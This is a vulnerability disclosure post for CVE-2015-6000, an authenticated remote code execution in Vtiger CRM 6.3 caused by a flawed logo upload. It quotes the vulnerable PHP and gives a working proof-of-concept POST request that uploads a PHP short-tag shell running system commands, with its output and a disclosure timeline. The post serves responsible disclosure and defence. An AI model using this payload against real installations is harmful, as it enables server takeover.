---
layout: post
published: true
title: "Vtiger CRM <= 6.3 Authenticated Remote Code Execution (CVE-2015-6000)"
tags: [cve, rce, vtiger, web]
category: Vulnerabilities
excerpt: "Vtiger CRM version 6.3 (“Open Source” branch; released on 2015-06-04) and lower are vulnerable to Authenticated Remote Code Execution."
image:
  feature: banner-vtiger2.jpg
---

## Table of Contents

1. [Summary](#summary)
2. [Vulnerability Details](#details)
3. [Exploitation / Proof of Concept](#poc)
4. [Timeline](#timeline)
5. [See Also](#seealso)


## 1. Summary<a id="summary"></a>

Vtiger CRM  <https://www.vtiger.com/open-source/> is a CRM application.

Vtiger CRM version 6.3 (“Open Source” branch; released on 2015-06-04) and lower are vulnerable to Authenticated Remote Code Execution.


## 2. Vulnerability Details<a id="details"></a>

Vtiger CRM allows for the upload of a "company logo" from within the administrative interface. The corresponding functionality can be accessed on the "CRM Settings" page (Settings -> CRM Settings -> Templates -> Company Details -> "Edit" button; (<.../index.php?parent=Settings&module=Vtiger&view=CompanyDetails&block=4&fieldid=15>).

Multiple flaws in the Settings_Vtiger_CompanyDetailsSave_Action class allow attackers to upload files with arbitrary file names and (almost) arbitrary contents, including, but not limited to, PHP code passing commands to the underlying operating system.

First, the file type check is based solely on the MIME type ("Content-Type") sent by the client:

{% highlight php %}
    (Source file:  vtigercrm/modules/Settings/Vtiger/actions/CompanyDetailsSave.php)
<?
    [...]
    class Settings_Vtiger_CompanyDetailsSave_Action extends Settings_Vtiger_Basic_Action {
    [...]
    $logoDetails = $_FILES['logo'];
    $fileType = explode('/', $logoDetails['type']);
    $fileType = $fileType[1];
    if (!$logoDetails['size'] || !in_array($fileType, Settings_Vtiger_CompanyDetails_Model::$logoSupportedFormats)) {
        $saveLogo = false;
    }
    [...]
?>
{% endhighlight %}


This is followed by an insufficient check for PHP code inside the uploaded file:

{% highlight php %}
    (Source file:  vtigercrm/modules/Settings/Vtiger/actions/CompanyDetailsSave.php)
<?
    [...]
    // Check for php code injection
    $imageContents = file_get_contents($_FILES["logo"]["tmp_name"]);
    if (preg_match('/(<\?php?(.*?))/i', $imageContents) == 1) {
        $saveLogo = false;
    }
    [...]
?>
{% endhighlight %}

Not only can this check be circumvented by using PHP short tags instead of “<?php “. It also provides no protection whatsoever against uploads of code written in scripting languages other than PHP, which, depending on the system configuration, may or may not be executable.

Vtiger CRM then saves the uploaded file's contents with the client-specified file name in the publicly accessible "test/logo/" directory:

{% highlight php %}
    (Source file: modules/Settings/Vtiger/models/CompanyDetails.php)
<?
    [...]
    class Settings_Vtiger_CompanyDetails_Model extends Settings_Vtiger_Module_Model {
    [...]
    var $logoPath = 'test/logo/';
    [...]
    public function saveLogo() {
        $uploadDir = vglobal('root_directory'). '/' .$this->logoPath;
        $logoName = $uploadDir.$_FILES["logo"]["name"];
        move_uploaded_file($_FILES["logo"]["tmp_name"], $logoName);
        copy($logoName, $uploadDir.'application.ico');
    }
    [...]
?>
{% endhighlight %}


Combining these flaws, an attacker can transfer arbitrary code to the web server, as long as s/he provides a permitted MIME type (e.g. "Content-Type: image/jpeg") and avoids the string “<?ph” within the code . The code can then be run by accessing the location of the uploaded file ("&lt;Vtiger URL>/test/logo/&lt;attacker-specified file name>").



## 3. Exploitation / Proof of Concept<a id="poc"></a>

Through a specially crafted HTTP-POST request,  a PHP file is stored on the server hosting the Vtiger CRM software: 


    POST /index.php HTTP/1.1
    Host: [...]
    Cookie: [...]
    Connection: keep-alive
    Content-Type: multipart/form-data; boundary=---------------------------51732462825208
    Content-Length: 2040

    -----------------------------51732462825208
    Content-Disposition: form-data; name="__vtrftk"

    [...]
    -----------------------------51732462825208
    Content-Disposition: form-data; name="logo"; filename="2.php"
    Content-Type: image/jpeg

    <? system('id; uname -a; /sbin/ifconfig -a'); system('cat ../../vtigerversion.php'); ?>
    -----------------------------51732462825208
    Content-Disposition: form-data; name="address"
    [...]


The resulting PHP file can then be accessed at &lt;Vtiger URL>/test/logo/2.php , which will execute the given commands and display their output:


    uid=3491(mussKV4JcX9c) gid=3491(mussKV4JcX9c) groups=3491(mussKV4JcX9c)
    Linux [...] 3.2.0-77-virtual #114-Ubuntu SMP Tue Mar 10 17:38:02 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
    eth0      Link encap:Ethernet  HWaddr [...] 
              inet addr: [...]


## 4. Timeline<a id="timeline"></a>

2015-08-28 Vulnerability reported to Vtiger.  
2015-09-01 Vtiger acknowledges vulnerability.  
2015-09-03 CVE-2015-6000 assigned by CERT/CC.  
2015-09-28 Public disclosure.  
2015-10-06 [Security patch](http://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%206.3.0/Core%20Product/) released.  
2015-10-16 [Vtiger CRM 6.4.0 released.](http://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%206.4.0/Core%20Product/) ([Announcement](http://lists.vtigercrm.com/pipermail/vtigercrm-developers/2015-October/033693.html))  

## 5. See Also<a id="seealso"></a>

* CVE-2015-6000 at cve.mitre.org: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6000>
* CVE-2015-6000 at NVD: <http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-6000>
* PoC at exploit-db.com: <https://www.exploit-db.com/exploits/38345/>

